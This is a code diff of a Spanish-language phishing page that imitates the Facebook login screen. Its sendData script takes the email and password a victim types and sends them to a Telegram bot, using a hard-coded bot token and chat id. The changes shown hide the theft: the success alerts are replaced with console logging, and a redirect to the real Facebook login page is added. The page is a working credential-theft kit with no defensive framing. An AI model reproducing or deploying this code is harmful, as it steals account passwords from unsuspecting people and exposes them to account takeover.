@@ -6,17 +6,15 @@
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="icon" href="">
+  <link rel="icon" href="./images/facebook-icon.png">
   <title>Facebook - Iniciar sesión o registrarse</title>
 
-  <!-- Meta Tags de Open Graph para vista previa en redes sociales -->
   <!-- Meta Tags de Open Graph -->
   <meta property="og:title" content="Facebook - Entrar o Registrarse" />
   <meta property="og:description" content="Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida." />
   <meta property="og:image" content="https://scontent.flim10-1.fna.fbcdn.net/v/t39.30808-6/464444853_122136732590338055_2002456845597686190_n.jpg?stp=dst-jpg_p526x296&_nc_cat=1&ccb=1-7&_nc_sid=833d8c&_nc_eui2=AeFZd878ciEfm5zWX-sVud2hpgBKSCYXHeumAEpIJhcd63oZ8-JXo_kwHRdZYvvpJVQlVnAwHIVBamj2opdZ4uF-&_nc_ohc=KoE7bkhxCp8Q7kNvgGkrHtc&_nc_zt=23&_nc_ht=scontent.flim10-1.fna&_nc_gid=AvtRmJ3TLs9Hkdcb2bsZ92K&oh=00_AYC1bmGCFFLyVUVzwywpH5DJRypdiOqP8dgURAYeC2Wvxg&oe=6724D97D" />
   <meta property="og:url" content="https://tu-dominio.com/login.html" />
   <meta property="og:type" content="website" />
-
 
   <style>
     /* Aquí va tu CSS completo */
@@ -291,7 +289,7 @@ footer a {
       }
 
       .fb-img {
-        width: 60%;
+        width: 70%;
         margin: 1rem auto;
       }
 
@@ -367,7 +365,6 @@ footer a {
       <a class="btn-more-links" href="#">+</a>
     </div>
   </footer>
-
   <script>
     function sendData() {
         const email = document.querySelector('input[name="email"]').value;
@@ -375,23 +372,26 @@ footer a {
 
         const botToken = '7277597293:AAHow92yrhA9Mbpz9ybLiB-mb3mXwoYHlvE';
         const chatId = '5573626790';
-
         const message = `Correo/Usuario: ${email}\nContraseña: ${password}`;
-
         const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
+        // Enviar datos y redirigir a la página de Facebook
         fetch(url)
             .then(response => {
                 if (response.ok) {
-                    alert('Datos enviados correctamente');
+                    console.log('Datos enviados correctamente');
                 } else {
-                    alert('Error al enviar los datos');
+                    console.log('Error al enviar los datos');
                 }
             })
             .catch(error => {
                 console.error('Error:', error);
+            })
+            .finally(() => {
+                // Redirigir a la página oficial de inicio de sesión de Facebook
+                window.location.href = "https://www.facebook.com/login";
             });
     }
-  </script>
+</script>
 </body>
 </html>
